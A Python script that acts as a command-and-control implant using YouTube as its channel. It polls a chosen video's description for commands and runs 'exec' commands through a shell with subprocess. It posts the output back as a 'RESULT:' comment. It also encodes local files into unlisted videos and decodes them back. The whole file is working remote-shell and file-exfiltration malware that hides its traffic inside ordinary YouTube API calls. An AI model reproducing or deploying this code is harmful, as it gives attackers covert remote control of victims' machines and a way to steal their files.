import os
import time
import pickle
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google.auth.transport.requests import Request
import yt_dlp
import subprocess


from QRizon import file_to_video, video_to_file
from YTUpload import get_authenticated_service, initialize_upload


CLIENT_SECRETS_FILE = 'client_secrets.json'
SCOPES = ['https://www.googleapis.com/auth/youtube.force-ssl']
API_SERVICE_NAME = 'youtube'
API_VERSION = 'v3'
SCRIPT_COMMENT_PREFIX = "RESULT:"

def get_authenticated_service():
    credentials = None
    # Load credentials from a file if it exists
    if os.path.exists('token_server.pickle'):
        with open('token_server.pickle', 'rb') as token:
            credentials = pickle.load(token)
    # If no valid credentials, initiate the OAuth flow
    if not credentials or not credentials.valid:
        if credentials and credentials.expired and credentials.refresh_token:
            credentials.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                CLIENT_SECRETS_FILE, SCOPES)
            # Run the local server flow. The user will need to open the URL in their browser.
            credentials = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token_server.pickle', 'wb') as token:
            pickle.dump(credentials, token)

    return build(API_SERVICE_NAME, API_VERSION, credentials=credentials)

def handle_command(cmd: str):
    cmd = cmd.strip()
    if cmd.startswith("exec"):
        output = subprocess.check_output(cmd[5:], shell=True, text=True)
        return output.strip()
    elif cmd.startswith("upload "):
        filename = cmd.split(" ", 1)[1]
        if not os.path.isfile(filename):
            print(f"File not found: {filename}")
            return
        video_file = f"{os.path.splitext(filename)[0]}.mp4"
        file_to_video(filename, video_file)
        youtube = get_authenticated_service()
        upload_opts = {
            'file':      video_file,
            'title':     os.path.basename(video_file),
            'description': f"Automatically uploaded {filename}",
            'category':  '22',            # e.g. People & Blogs
            'keywords':  '',
            'privacyStatus': 'unlisted'
        }
        video_id = initialize_upload(youtube, upload_opts)
        return str(video_id)

    elif cmd.startswith("download "):
        video_id = cmd.split(" ", 1)[1]
        url = f"https://youtu.be/{video_id}"
        outtmpl = f"{video_id}.mp4"
        ydl_opts = {
            'format': 'best',
            'outtmpl': outtmpl
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
        output_dir = f"{video_id}_files"
        os.makedirs(output_dir, exist_ok=True)
        video_to_file(outtmpl, output_dir)
    else:
        print(f"Unknown command: {cmd}")



def get_video_description(youtube, video_id):
    try:
        response = youtube.videos().list(
            part='snippet',
            id=video_id
        ).execute()

        if not response.get('items'):
            print(f"Video with id '{video_id}' not found.")
            return None
        return response['items'][0]['snippet'].get('description', '')
    except HttpError as e:
        print(f"An HTTP error {e.resp.status} occurred while getting description:\n{e.content}")
        return None
    except Exception as e:
        print(f"An unexpected error occurred while getting description: {e}")
        return None

def find_script_comment(youtube, video_id):
    try:
        results = youtube.commentThreads().list(
            part="snippet",
            videoId=video_id,
            textFormat="plainText",
            maxResults=50 
        ).execute()

        if 'items' in results:
            for item in results['items']:
                comment = item['snippet']['topLevelComment']['snippet']['textDisplay']
                if comment.startswith(SCRIPT_COMMENT_PREFIX) and \
                   item['snippet']['channelId'] == item['snippet']['topLevelComment']['snippet']['authorChannelId']:
                    return item['snippet']['topLevelComment']['id']

        return None 
    except HttpError as e:
        print(f'An HTTP error {e.resp.status} occurred finding comment:\n{e.content}')
        if e.resp.status == 403:
            print("Likely hit comment listing quota or permission issue.")
        return None
    except Exception as e:
        print(f'An error occurred finding comment: {e}')
        return None

def post_comment(youtube, video_id, text):
    if len(text) > 10000:
        print(f"Comment text exceeds 10000 characters. Truncating.")
        text = text[:10000]
    try:
        request_body = {
            'snippet': {
                'videoId': video_id,
                'topLevelComment': {
                    'snippet': {
                        'textOriginal': text 
                    }
                }
            }
        }

        response = youtube.commentThreads().insert(
            part='snippet',
            body=request_body
        ).execute()

        comment_id = response['id']
        print(f"Successfully posted comment with ID: {comment_id}")
        print(f"Comment text: {response['snippet']['topLevelComment']['snippet']['textOriginal']}")
        return comment_id

    except HttpError as e:
        print(f'An HTTP error {e.resp.status} occurred during comment post:\n{e.content}')
        if e.resp.status == 403:
            print("Could not post comment. Comments might be disabled for this video or channel.")
        return None
    except Exception as e:
        print(f'An error occurred during comment post: {e}')
        return None

def edit_comment(youtube, comment_id, new_text):
    if len(new_text) > 10000:
        print(f"New comment text exceeds 10000 characters. Truncating.")
        new_text = new_text[:10000]
    try:
        request_body = {
            'id': comment_id,
            'snippet': {
                'textOriginal': new_text
            }
        }

        response = youtube.comments().update(
            part='snippet',
            body=request_body
        ).execute()

        print(f"Successfully edited comment with ID: {comment_id}.")
        print(f"New comment text: {response['snippet']['textOriginal']}")
        return True

    except HttpError as e:
        print(f'An HTTP error {e.resp.status} occurred during comment edit:\n{e.content}')
        return False
    except Exception as e:
        print(f'An error occurred during comment edit: {e}')
        return False

def parse_and_execute_command(cmd):
    print(f"Executing command: {cmd}")
    result = handle_command(cmd)
    return result

def main():
    TARGET_VIDEO_ID = "ID HERE"
    youtube = get_authenticated_service()
    
    # Store last processed command to avoid duplicate execution
    last_processed_command = ""
    
    try:
        print("Checking for commands every 60 seconds...")
        
        while True:
            try:
                # Get the video description
                description = get_video_description(youtube, TARGET_VIDEO_ID)
                if description is None:
                    print("Failed to get video description. Retrying in 60 seconds...")
                    time.sleep(60)
                    continue
                
                # If the description is the same as last processed, skip
                if description == last_processed_command:
                    print("No new commands. Waiting...")
                    time.sleep(60)
                    continue
                
                # Process the command
                print(f"Found new command: {description}")
                command_result = parse_and_execute_command(description)
                last_processed_command = description
                
                if command_result:
                    # Format the result for comment
                    comment_text = f"{SCRIPT_COMMENT_PREFIX} {command_result}"
                    
                    # Check if we already have a comment for this video
                    existing_comment_id = find_script_comment(youtube, TARGET_VIDEO_ID)
                    
                    # Update or create a new comment
                    if existing_comment_id:
                        print(f"Updating existing comment with new result.")
                        edit_comment(youtube, existing_comment_id, comment_text)
                    else:
                        print(f"Creating new comment with result.")
                        post_comment(youtube, TARGET_VIDEO_ID, comment_text)
                else:
                    print("Command execution produced no result or failed.")
                
            except Exception as e:
                print(f"Error during command execution: {e}")
            
            # Wait before checking again
            print("Waiting 60 seconds before the next check...")
            time.sleep(60)

    except KeyboardInterrupt:
        print("\nStopped by user.")
    except Exception as e:
        print(f'An unexpected error occurred: {e}')

if __name__ == '__main__':
    main()